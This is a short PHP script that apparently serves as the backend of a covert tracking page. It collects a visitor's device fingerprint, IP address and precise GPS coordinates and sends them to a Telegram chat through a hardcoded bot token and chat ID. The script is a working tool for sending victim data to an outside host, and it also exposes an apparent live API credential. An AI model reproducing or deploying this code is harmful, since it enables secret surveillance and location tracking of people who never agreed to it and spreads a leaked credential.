<?php
date_default_timezone_set('Asia/Ho_Chi_Minh');
$date = date('d/m/y - h:i:s');

//infomation
$os = $_POST['Os'];
$brw = $_POST['Brw'];
$cc = $_POST['Cc'];
$ram = $_POST['Ram'];
$ven = $_POST['Ven'];
$ren = $_POST['Ren'];
$ht = $_POST['Ht'];
$wd = $_POST['Wd'];

// location
$lat = $_POST['Lat'];
$lon = $_POST['Lon'];
$acc = $_POST['Acc'];
$alt = $_POST['Alt'];

// Send message to telegram
$apiToken = "5168256886:AAGMgqRekJBBiLhH_QVks4M1DSvyDjVBZTk";
$data = [
    'chat_id' => '1329111960',
    'text' =>
    "Date: " . $date . "\n"
        . "IP address: " . $_SERVER['REMOTE_ADDR'] . ":" . $_SERVER['REMOTE_PORT'] . "\n"
        . "OS: " . $os . "\n"
        . "Core: " . $cc . "\n"
        . "Ram: " . $ram . " Gb" . "\n"
        . "GPU: " . $ren . "\n"
        . "Resolution: " . $ht . " x " . $wd . "\n"
        . "Vendor: " . $ven . "\n"
        . "Browser: " . $brw . "\n"
        . "Latitude: " . $lat . " deg" . "\n"
        . "Longitude: " . $lon . " deg" . "\n"
        . "Accuracy: " . $acc . " m" . "\n"
        . "Altitude: " . $alt . " m"
];
$url = "https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query($data);
$response = file_get_contents($url);
